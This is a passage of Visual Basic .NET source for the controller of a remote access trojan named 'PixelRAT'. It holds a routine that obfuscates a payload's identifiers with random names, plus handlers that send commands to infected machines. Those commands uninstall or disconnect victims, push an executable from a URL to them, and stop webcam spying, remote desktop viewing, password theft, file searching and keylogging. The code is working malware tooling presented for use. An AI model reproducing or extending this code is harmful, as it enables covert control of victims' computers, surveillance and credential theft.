                Dim r2 As Regex = New Regex(pattern2, RegexOptions.IgnoreCase)


                ' Match the regular expression pattern against a text string.
                If r2.IsMatch(text2) = True Then



                Else
                    Try
                        yo += 1
                        If yo = thatperc Then
                            MProgress3.Current += 1
                            yo = 0
                        End If





                        Dim KeyGen As RandomKeyGenerator
                        Dim NumKeys As Integer
                        Dim i_Keys As Integer
                        Dim RandomKey As String



                        NumKeys = 20

                        KeyGen = New RandomKeyGenerator
                        KeyGen.KeyLetters = "abcdefghijklmnopqrstuvwxyz"
                        KeyGen.KeyNumbers = "abcdefghijklmnopqrstuvwxyz"
                        KeyGen.KeyChars = 10

                        RandomKey = KeyGen.Generate()
                        Label44.Text = "Obfuscating...: " & RandomKey
                        If item.Contains("()") Then
                            item = item.Replace("()", "")
                        End If

                        Dim userName As String = RichTextBox6.Text
                        Dim re As New Regex(" " & item & "\b")
                        userName = re.Replace(userName, " " & RandomKey)

                        RichTextBox6.Text = userName
                        Dim userName2 As String = RichTextBox6.Text
                        Dim re2 As New Regex("\r" & item & "\b")
                        MProgress5.Current = 25
                        userName2 = re2.Replace(userName2, RandomKey)

                        RichTextBox6.Text = userName2
                        Dim userName3 As String = RichTextBox6.Text
                        Dim re7 As New Regex("\050" & item & " ")
                        userName3 = re7.Replace(userName3, "(" & RandomKey & " ")
                        RichTextBox6.Text = userName3

                        Dim re3 As New Regex("\050" & item & "\056")
                        userName3 = re3.Replace(userName3, "(" & RandomKey & ".")
                        RichTextBox6.Text = userName3

                        MProgress5.Current = 50
                        Dim re5 As New Regex("\050" & item & "\054")
                        userName3 = re5.Replace(userName3, "(" & RandomKey & ",")
                        RichTextBox6.Text = userName3

                        Dim re6 As New Regex("\050" & item & "\050")
                        userName3 = re6.Replace(userName3, "(" & RandomKey & "(")
                        RichTextBox6.Text = userName3

                        Dim re9 As New Regex("\050" & item & "\051")
                        userName3 = re9.Replace(userName3, "(" & RandomKey & ")")
                        RichTextBox6.Text = userName3

                        Dim rea As New Regex("\173" & item & " ")
                        userName3 = rea.Replace(userName3, "{" & RandomKey & " ")
                        RichTextBox6.Text = userName3

                        Dim res As New Regex("\173" & item & "\056")
                        userName3 = res.Replace(userName3, "{" & RandomKey & ".")
                        RichTextBox6.Text = userName3

                        Dim red As New Regex("\173" & item & "\054")
                        userName3 = red.Replace(userName3, "{" & RandomKey & ",")
                        RichTextBox6.Text = userName3

                        Dim ref As New Regex("\173" & item & "\050")
                        userName3 = ref.Replace(userName3, "{" & RandomKey & "(")
                        RichTextBox6.Text = userName3
                        MProgress5.Current = 75
                        Dim reg As New Regex("\173" & item & "\051")
                        userName3 = reg.Replace(userName3, "{" & RandomKey & ")")
                        RichTextBox6.Text = userName3
                        MProgress5.Current = 100
                        Dim read As New Regex("\175" & item & " ")
                        userName3 = read.Replace(userName3, "{" & RandomKey & " ")
                        RichTextBox6.Text = userName3

                        Dim resd As New Regex("\173" & item & "\175")
                        userName3 = resd.Replace(userName3, "{" & RandomKey & "}")
                        RichTextBox6.Text = userName3


                        Dim redd As New Regex("\054" & item & "\175")
                        userName3 = redd.Replace(userName3, "," & RandomKey & "}")
                        RichTextBox6.Text = userName3


                        Dim regd As New Regex("\056" & item & "\175")
                        userName3 = regd.Replace(userName3, "." & RandomKey & "}")
                        RichTextBox6.Text = userName3
                        MProgress5.Current = 100

                        'richtextbox6.Text = richtextbox6.Text.Replace("\b" & item & "\b", RandomKey)


                    Catch ex As Exception
                    End Try
                End If
            Catch ex As Exception
            End Try



        Next
        MProgress5.Current = 0

        Finisher()

    End Sub
    Public Function GetBetween(ByRef strSource As String, ByRef strStart As String, ByRef strEnd As String, _
                           Optional ByRef startPos As Integer = 0) As String
        Dim iPos As Integer, iEnd As Integer, lenStart As Integer = strStart.Length
        Dim strResult As String

        strResult = String.Empty
        iPos = strSource.IndexOf(strStart, startPos)
        iEnd = strSource.IndexOf(strEnd, iPos + lenStart)
        If iPos <> -1 AndAlso iEnd <> -1 Then
            strResult = strSource.Substring(iPos + lenStart, iEnd - (iPos + lenStart))
        End If
        Return strResult
    End Function

    Private Sub Button1_Click_2(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub PictureBox7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox7.Click



        If ColorDialog1.ShowDialog() = DialogResult.OK Then
            MProgress1.Color1 = ColorDialog1.Color
            MProgress2.Color1 = ColorDialog1.Color
            MProgress3.Color1 = ColorDialog1.Color
            MProgress4.Color1 = ColorDialog1.Color
            PictureBox7.BackColor = ColorDialog1.Color


        End If

    End Sub

    Private Sub PictureBox8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox8.Click



        If ColorDialog1.ShowDialog() = DialogResult.OK Then
            MProgress1.Color2 = ColorDialog1.Color
            MProgress2.Color2 = ColorDialog1.Color
            MProgress3.Color2 = ColorDialog1.Color
            MProgress4.Color2 = ColorDialog1.Color
            PictureBox8.BackColor = ColorDialog1.Color


        End If
    End Sub

    Private Sub MButtonnone38_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone38.Click

        If MProgress4.Current = 50 Then
            MProgress4.Current = 100
        Else
            MProgress4.Current = 50
        End If

    End Sub

    Private Sub MButtonnone39_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone39.Click
        Form5.Show()
    End Sub



    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click

    End Sub

    Private Sub SelectedToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SelectedToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            Try
                Plague("UNINSTALL|" & id)
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        Next
    End Sub

    Private Sub AllToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AllToolStripMenuItem.Click
        Try
            Plague("UNINSTALL|ALL")
        Catch ex As Exception
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
        End Try
    End Sub

    Private Sub SelectedToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SelectedToolStripMenuItem1.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            Try
                Plague("DISCONNECT|" & id)
                nousers -= 1

                Label3.Text = nousers & "/" & ListView1.Items.Count & " connected"
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Disconnecting user " & id & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        Next

        Label3.Text = nousers & "/" & ListView1.Items.Count & " connected"
    End Sub

    Private Sub AllToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AllToolStripMenuItem1.Click
        If islisten = 0 Then



        Else

            Try
                Plague("DISCONNECT|ALL")
                MTheme1.Text = "PixelRAT :: No users online"
                Label3.Text = "No users online"
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Disconnecting all..." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try

            Try
                listener.Stop()
            Catch ex As Exception
            End Try
        End If

        Icount = 0
        ListView1.Clear()
        hidethat("ConnectionPanel", ConnectionPanel)

    End Sub



    Private Sub GoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GoToolStripMenuItem.Click
        If ToolStripTextBox1.Text.Contains("www") Then
            For Each item As ListViewItem In ListView1.SelectedItems
                Dim dnsget As String
                dnsget = item.SubItems(3).ToString()

                Dim dataarray As String()

                dataarray = dnsget.Split("{")
                dnsget = dataarray(1)
                Dim dataarray2 As String()

                dataarray2 = dnsget.Split("}")
                dnsget = dataarray2(0)
                id = dnsget

            Next
            Try
                Plague("UPDATEME|" & id & "|" & ToolStripTextBox1.Text)
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Updating " & id & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Updating failed, please try again." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        Else
            MsgBox("Please enter a valid URL to where your executable file is located.")
        End If

    End Sub

    Private Sub GoToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GoToolStripMenuItem1.Click
        If ToolStripTextBox2.Text.Contains("www") Then
            Try
                Plague("UPDATEME|ALL|" & ToolStripTextBox2.Text)
                Plague("UPDATEME|" & id & "|" & ToolStripTextBox1.Text)
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Updating All with " & ToolStripTextBox2.Text & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Updating failed, please try again." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        Else

            MsgBox("Please enter a valid URL to where your executable file is located.")
        End If

    End Sub

    Private Sub FutureTheme1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FutureTheme1.Click


    End Sub

    Private Sub MButtonnone42_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone42.Click
        If MButtonnone42.Text = "Pop-out window" Then

            MButtonnone42.Text = "Small Window"
            Form8.Show()
        Else
            Form8.Hide()
            whichwindow = "SMALL"
            MButtonnone42.Text = "Pop-out window"
        End If
    End Sub


    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget

        Next
        Try
            Plague("REFRESH|" & id)
        Catch ex As Exception
        End Try

        For Each item As ListViewItem In ListView1.Items
            If item.SubItems(3).ToString = "ListViewSubItem: {" & id & "}" Then

                item.Remove()
            End If
        Next
    End Sub

    Private Sub Label61_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label61.Click

    End Sub

    Private Sub CheckBox11_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox11.CheckedChanged

    End Sub
    Public Function listitem(ByVal input As String)
        Dim start As String = input
        Dim split1 As String() = start.Split("{")
        Dim split2 As String() = split1(1).ToString.Split("}")
        Return split2(0)

    End Function

    Private Sub MButtonnone43_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone43.Click
        Process.Start("http://www.pixelfrag.com/pixelrat/news.php")
    End Sub
    Private Sub BackgroundWorker2_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        On Error Resume Next
        Plague("WEBCAM|STOP|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        '   alreadyd = 0
        isdesktop = 5

        Plague("REMOTE|STOP|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        ' alreadyd = 0
        isdesktop = 5

        System.Threading.Thread.Sleep(500)

        'Broadcast("GETPASS|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        Plague("STOPPASS|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        MProgress2.Current = 0

        System.Threading.Thread.Sleep(500)

        Plague("FILESEARCH|" & id & "|" & "STOP")
        MButtonnone4.Text = "Search For File"

        System.Threading.Thread.Sleep(1000)
        isdesktop = 4
        If nSccmNsEuJrhktxsjghgIbxbqdvegh = 1 Then

            nSccmNsEuJrhktxsjghgIbxbqdvegh = 0
            Plague("KEYLOGGER|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & "STOP")

        End If
    End Sub

    Private Sub Form1_LocationChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.LocationChanged

    End Sub

    Private Sub settingspanel_Paint(ByVal sender As System.Object, ByVal e As System.Windows.Forms.PaintEventArgs) Handles settingspanel.Paint

    End Sub
End Class



